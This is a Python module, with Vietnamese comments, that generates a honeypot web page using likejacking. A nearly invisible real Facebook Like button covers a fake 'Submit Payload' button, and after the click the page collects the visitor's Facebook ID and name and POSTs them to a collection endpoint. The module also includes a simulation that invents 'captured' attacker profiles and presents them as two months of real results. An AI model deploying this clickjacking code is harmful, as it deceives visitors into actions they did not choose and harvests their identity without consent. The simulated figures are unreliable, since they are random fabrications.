# likejacking.py
from dataclasses import dataclass
from typing import List
import random

@dataclass
class LikeJackResult:
    attacker_ip:      str
    facebook_profile: str    # Profile bị lộ qua Like
    click_timestamp:  str
    page_liked:       str
    success:          bool

class LikeJacking:
    """
    Kỹ thuật LikeJacking - Thu thập Facebook profile kẻ tấn công

    Cách hoạt động:
    1. Nhúng nút Facebook Like thật vào trang bẫy
    2. Nút Like được CSS overlay (transparent, z-index cao)
    3. Kẻ tấn công nhấn vào bất kỳ đâu → vô tình Like trang
    4. Facebook gửi thông tin về user về server
    5. Thu thập được Facebook ID/profile của kẻ tấn công!
    """

    HONEYPOT_FACEBOOK_PAGE = "https://www.facebook.com/BeritaHariIni"

    def generate_likejacking_html(self) -> str:
        """
        Tạo HTML với LikeJacking button
        Nút Like Facebook thật nhưng ẩn bằng CSS
        """
        return f"""
        <!-- LikeJacking Component -->
        <style>
        .like-wrapper {{
            position: relative;
            width: 100%;
            height: 100%;
        }}
        /* Nút Like thật - transparent, overlay toàn trang */
        .fb-like-hidden {{
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            opacity: 0.001;        /* Gần như vô hình */
            z-index: 9999;         /* Trên tất cả element */
            cursor: pointer;
        }}
        /* Nút giả visible để kẻ tấn công tưởng đang nhấn */
        .fake-button {{
            background: #e74c3c;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }}
        </style>

        <div class="like-wrapper">
            <!-- Nút giả - kẻ tấn công thấy -->
            <button class="fake-button">
                🔍 Cari Kerentanan / Submit Payload
            </button>

            <!-- Nút Like Facebook thật - ẩn đè lên -->
            <div class="fb-like-hidden">
                <div class="fb-like"
                     data-href="{self.HONEYPOT_FACEBOOK_PAGE}"
                     data-width=""
                     data-layout="button_count"
                     data-action="like"
                     data-size="small"
                     data-share="false">
                </div>
            </div>

            <!-- Facebook SDK -->
            <div id="fb-root"></div>
            <script>
            window.fbAsyncInit = function() {{
                FB.init({{
                    appId   : 'HONEYPOT_APP_ID',
                    xfbml   : true,
                    version : 'v18.0'
                }});

                // Khi Like xảy ra → thu thập Facebook info
                FB.Event.subscribe('edge.create', function(href, widget) {{
                    FB.api('/me', function(response) {{
                        // Gửi profile về honeypot server
                        fetch('/likejack-collect', {{
                            method : 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body   : JSON.stringify({{
                                fb_id  : response.id,
                                fb_name: response.name,
                                page   : href,
                                ts     : new Date().toISOString()
                            }})
                        }});
                    }});
                }});
            }};
            (function(d, s, id) {{
                var js, fjs = d.getElementsByTagName(s)[0];
                if (d.getElementById(id)) return;
                js     = d.createElement(s);
                js.id  = id;
                js.src = "https://connect.facebook.net/id_ID/sdk.js";
                fjs.parentNode.insertBefore(js, fjs);
            }}(document, 'script', 'facebook-jssdk'));
            </script>
        </div>"""

    def simulate_likejack_capture(self,
                                  n_attacks: int = 50) -> List[LikeJackResult]:
        """
        Mô phỏng kết quả thu thập Facebook profiles
        trong 2 tháng thực tế
        """
        import time
        results = []

        fake_profiles = [
            "hacker_anonim_123",
            "script_kiddie_99",
            "b4d_guy_indonesia",
            "sql_master_2024",
            "xss_hunter_pro",
            "security_researcher_id",
            "pentest_guy_bdg",
            "ethical_hacker_jkt",
            "cybersec_student_ui",
            "wannabe_hacker_007",
        ]

        fake_pages = [
            "/cari-berita?q=",
            "/komentar?msg=",
            "/berita?id=",
        ]

        for i in range(n_attacks):
            # 60% kẻ tấn công bị dính LikeJacking
            success = random.random() < 0.60
            results.append(LikeJackResult(
                attacker_ip=f"{random.randint(1,223)}."
                            f"{random.randint(0,255)}."
                            f"{random.randint(0,255)}."
                            f"{random.randint(1,254)}",
                facebook_profile=(
                    random.choice(fake_profiles)
                    if success else "not_captured"
                ),
                click_timestamp=time.strftime(
                    "%Y-%m-%d %H:%M:%S"
                ),
                page_liked=random.choice(fake_pages),
                success=success,
            ))
        return results